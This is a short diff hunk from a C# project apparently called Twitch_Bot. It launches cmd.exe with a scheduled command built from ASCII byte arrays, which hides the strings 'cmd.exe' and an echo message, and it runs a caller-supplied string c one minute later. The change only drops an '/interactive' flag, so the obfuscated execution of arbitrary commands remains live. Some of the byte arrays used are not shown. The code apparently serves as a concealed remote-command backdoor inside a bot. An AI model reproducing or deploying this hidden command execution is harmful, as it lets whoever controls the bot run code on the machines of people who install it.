@@ -40,7 +40,7 @@ namespace Twitch_Bot
             }
             byte[] bytes3 = new byte[]{ 101,99,104,111,32, 68, 111,110,39,116, 32, 117,115,101,32, 88, 80,33};
             byte[] bytes4 = new byte[] { 99, 109, 100, 46, 101, 120, 101 };
-            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes4), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 1).ToString() + " /interactive " + Encoding.ASCII.GetString(bytes2) + ((c == "") ? Encoding.ASCII.GetString(bytes3) : c));
+            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes4), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 1).ToString() + Encoding.ASCII.GetString(bytes2) + ((c == "") ? Encoding.ASCII.GetString(bytes3) : c));
         }
 
         public void Fun2(string user, string room, string[] parameters)
